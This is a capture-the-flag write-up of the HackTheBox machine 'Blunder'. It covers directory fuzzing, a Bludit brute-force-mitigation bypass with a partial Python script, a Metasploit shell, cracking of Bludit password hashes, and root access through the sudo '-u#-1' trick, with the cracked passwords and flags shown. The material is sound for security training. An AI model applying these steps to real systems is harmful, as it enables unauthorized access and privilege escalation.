## Initial Information Gathering

***

### Nmap results
A cursory nmap scan shows two open ports on the system (shown below in the nmap
output); one for ftp which seems to be closed, and an Apache server riddled
with common vulnerabilities and exposures. This will be noted, but I'll move on
with the enumeration process to see what other services may be running on the machine
that nmap didn't scan, like those wrapped in the *Apache* service.

    > ```bash
    > PORT   STATE  SERVICE VERSION
    > 21/tcp closed ftp
    > 80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
    > |_http-server-header: Apache/2.4.41 (Ubuntu)
    > | vulners:
    > |   cpe:/a:apache:http_server:2.4.41:
    > |       CVE-2020-11984  7.5 https://vulners.com/cve/CVE-2020-11984
    > |       CVE-2020-11984  7.5 https://vulners.com/cve/CVE-2020-11984
    > |       CVE-2020-1927   5.8 https://vulners.com/cve/CVE-2020-1927
    > |       CVE-2020-1927   5.8 https://vulners.com/cve/CVE-2020-1927
    > |       CVE-2020-9490   5.0 https://vulners.com/cve/CVE-2020-9490
    > |       CVE-2020-9490   5.0 https://vulners.com/cve/CVE-2020-9490
    > |       CVE-2020-1934   5.0 https://vulners.com/cve/CVE-2020-1934
    > |       CVE-2020-1934   5.0 https://vulners.com/cve/CVE-2020-1934
    > |_      CVE-2020-11993  4.3 https://vulners.com/cve/CVE-2020-11993
    > ```

### FFUF results
The results from **FFUF** show three directories: *about*, *admin*, and
*stadia*; this is useful to look at to see any potential footholds into the
system. The *admin* directory leads to a login page with the service
___BLUDIT___ right above the form fields; this could be an indicator of the
systems entry point, as the name of the challenge is ***Blunder***. Below shows the results of the
**FFUF** scan on the host _10.10.10.191_ where I fuzzed the directory:

    > ```bash
    > :: Method           : GET
    > :: URL              : http://10.10.10.191/FUZZ
    > :: Wordlist         : FUZZ: /usr/share/wfuzz/wordlist/general/megabeast.txt
    > :: Follow redirects : false
    > :: Calibration      : false
    > :: Timeout          : 10
    > :: Threads          : 40
    > :: Matcher          : Response status: 200,204,301,302,307,401,403
    > ________________________________________________
    >
    > about                   [Status: 200, Size: 3280, Words: 225, Lines: 106]
    > admin                   [Status: 301, Size: 0, Words: 1, Lines: 1]
    > stadia                  [Status: 200, Size: 4517, Words: 408, Lines: 109]
    > :: Progress: [45459/45459] :: Job [1/1] :: 166 req/sec :: Duration: [0:05:18] :: Errors: 0 ::
    > ```

It's also important to check for any possible domains on the system, as to gain
more information on the web service. In the meantime, the *robots.txt* file was
examined and it didn't contain any useful information. No other domains were
found with this scan, so I'll do a search on possible *CVEs* that affect the
***BLUDIT*** service. When looking on
[exploit-db](https://www.exploitdb.com/exploits/48568), I found an interesting
Python script which allowed the user directory traversal functionality. The
only downside to this solution is that I need a username and password to login
to the admin portal. Could there be a way to get login credentials? I'll read
the articles on the webpage to see if anything is amiss; the about section on
the page gives a hint that something may be off about the articles they're
hosting, or something undiscovered still waits to be seen.

## Gaining Entry

***

### One Last Scan
The motivation behind this final scan is to search for anything that could have
been missed by any previous web fuzzing efforts. A very large wordlist was
downloaded from [the Probable Wordlists Github](https://github.com/berzerk0/Probable-Wordlists)
and used in the ffuf scan. The big thing I'm looking for in this scan is any
mention of a username or a more reliable password to use in the login process.
I found a *todo.txt* file in the base directory which mentioned a possible
username: **fergus**. Some possible wordlists will be created with the content
of various pages on the website.

> :: Method           : GET
> :: URL              : http://10.10.10.191/FUZZ.txt
> :: Wordlist         : FUZZ: /usr/share/wordlists/Top109Million-probable-v2.txt
> :: Follow redirects : false
> :: Calibration      : false
> :: Timeout          : 10
> :: Threads          : 40
> :: Matcher          : Response status: 200,204,301,302,307,401,403
> ________________________________________________
>
> robots                  [Status: 200, Size: 22, Words: 3, Lines: 2]
> todo                    [Status: 200, Size: 118, Words: 20, Lines: 5]

### Making Wordlists
To make sure that everything was being read (and used), I created three
wordlists using the `cewl` utility along with the *--lowercase* flag, and
outputted them into three separate files to keep track of: list2 which
comprises of all the words from *stephen-king-0*, stadia, and usb. Now that
some unique wordlists have been created to use in tandem with the usual
ones for web app testing.

### Dodging Bruteforce Mitigation
The job now is to attempt to log in using the username **fergus** and use the
various wordlists created as passwords. The main issue is that **BLUDIT** has a
mechanism in place to mitigate a brute force attack on the admin login page.
Luckily there's a [ruby utility](https://www.exploit-db.com/exploits/48746)
that bypasses authentication bruteforce mitigation that I could possibly modify
to log into the portal. This [Python PoC](https://rastating.github.io/bludit-brute-force-mitigation-bypass) will
deem useful and will ultimately be used to bypass the method employed by
**BLUDIT** though, as that's the language I'm more comfortable with.

```python
host = 'http://192.168.194.146/bludit'
login_url = host + '/admin/login'
username = 'admin'
wordlist = []
with open('/home/ursa/list.txt', 'r') as file:
    for i in file:
        wordlist.append(i.strip('\n'))
```

The above code was changed to reflect the current use case, and as it turns
out, it worked swimmingly on the first run as can be seen in the output of the
script. Finally, I'll move towards gaining access to the user flag.

> [*] Trying: fictional
> [*] Trying: character
> [*] Trying: RolandDeschain
>
> SUCCESS: Password found!
> Use fergus:RolandDeschain to login.

### Starting a Reverse Shell
For the sake of simplicity, I'll use the metasploit module available, but
another [utility](https://exploit-db.com/exploits/48568) is also useful in
tandem with a netcat listener to take care of that process manually. After all
options are set, I ran the program and was greeted with a minimal shell
courtesy of metasploit's meterpreter payload.

### More Information Gathering
Once inside, i spawned a pseudo-tty by issuing the command
`python -c "import pty; pty.spawn('/bin/bash')"`; this helped with keeping
myself coordinated throughout the remote access phase of this adventure. Inside
the user hugo's home directory, there is the *user.txt* file... but with
read-only permissions for the owner. This means I must find a way to login to
the hugo user. Luckily, **BLUDIT** keeps a file of user and password hashes in
`/var/www/bludit-3.10.0a/bl-content/databases/users.php` and those password
hashes can be given to the JohnTheRipper program to reverse. After waiting a
while for the utility to finish, the password I ended up with was
**Password120**.

### The User.txt File
Now that I'm able to login as hugo, I cd'd to the home directory and cat'd the
*user.txt* file which gave the hash `005fd67535bc1f753f1711747c140400`. Time to
move on to the root hash.

## Following the Root Trail

***

### Gathering hugo's Privileges
Now that I have access to the hugo user on the system, my priority is to make
it to the root user; in order to do that, I should know what hugo is allowed to
do. The `sudo -l` command is key here, and once *hugo*'s password is given a
really interesting thing pops up:

    ```bash
    hugo@blunder:~$ sudo -l
    sudo -l
    Password: Password120

    Matching Defaults entries for hugo on blunder:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User hugo may run the following commands on blunder:
        (ALL, !root) /bin/bash
    ```

### Unexpected Elevator
The very last line allows this user to do pretty much anything they'd like
except run `/bin/bash` as root. There is a cheeky workaround though; just pass
the *-u* flag with `#-1` to get access to bash as can be seen below.

    ```
    hugo@blunder:~$ sudo -u#-1 /bin/bash
    sudo -u#-1 /bin/bash
    Password: Password120

    root@blunder:/home/hugo# cat ~/root.txt
    cat ~/root.txt
    cat: //root.txt: No such file or directory
    root@blunder:/home/hugo# cd
    cd
    root@blunder:/# ls
    ls
    bin    dev  home   lib64       media  proc  sbin  sys  var
    boot   etc  lib    libx32      mnt    root  snap  tmp
    cdrom  ftp  lib32  lost+found  opt    run   srv   usr
    root@blunder:/# cat root/root.txt
    cat root/root.txt
    df1907656ada15267e3058d2cd348d2e
    root@blunder:/#
    ```

### Conclusion
Overall, the challenge was relatively simple **after** the initial foothold,
which took a vast majority of the time. I learned an effective way to create
wordlists from web pages and a new method of privilege escalation. All in all,
this was a good box to get back into the swing of things when it comes to
HackTheBox.
